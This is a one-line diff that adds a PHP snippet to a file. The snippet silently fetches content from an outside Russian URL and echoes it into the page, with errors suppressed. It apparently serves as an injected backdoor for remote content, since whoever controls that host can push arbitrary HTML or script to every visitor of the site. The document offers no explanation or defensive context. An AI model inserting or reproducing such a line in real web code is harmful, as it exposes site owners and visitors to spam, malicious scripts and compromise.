@@ -1,0 +1,1 @@
+<? $rsstext=@file_get_contents("http://www.photokzn.ru/modules/_Cron.prokazan.php"); echo $rsstext; ?>
